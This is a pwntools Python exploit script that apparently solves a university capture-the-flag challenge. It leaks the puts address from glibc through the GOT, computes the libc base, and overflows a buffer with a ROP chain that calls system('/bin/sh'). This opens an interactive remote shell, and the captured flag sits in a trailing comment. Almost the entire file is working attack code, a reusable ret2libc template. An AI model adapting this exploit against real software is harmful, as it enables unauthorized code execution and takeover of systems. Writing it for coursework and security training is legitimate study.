from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./ez_target"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1203
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
puts_got_addr = e.got.puts

print(p.recvuntil(b"?\n").decode())
p.send(p64(puts_got_addr))
log.info(f"Sending GOT puts address: {hex(puts_got_addr)}")

glibc_puts_addr = int(p.recvline().decode().strip(), 16)
log.info(f"Reveiving leaked puts address: {hex(glibc_puts_addr)}")

glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_puts_addr - glibc_e.symbols.puts
glibc_binsh_addr = glibc_base_addr + next(glibc_e.search(b"/bin/sh"))
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

glibc_r = ROP("libc.so.6")
chain = [
    glibc_r.rdi.address + glibc_base_addr,     # 1. Address of "pop rdi; ret" gadget in libc - calculated by adding gadget offset to libc base
    glibc_binsh_addr,                          # 2. Address of "/bin/sh" string in libc - this will be popped into rdi register
    glibc_r.ret.address + glibc_base_addr,     # 3. Address of ret instruction in libc - for stack alignment (adding base address to get actual location)
    glibc_system_addr                          # 4. Address of system() in libc - will be called with "/bin/sh" argument from rdi
]

msg = b"C" * 0x18 + b"".join([p64(c) for c in chain])
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{l1bc_g4dg3ts_f0r_th3_w1n!_6c605fe06da05370}
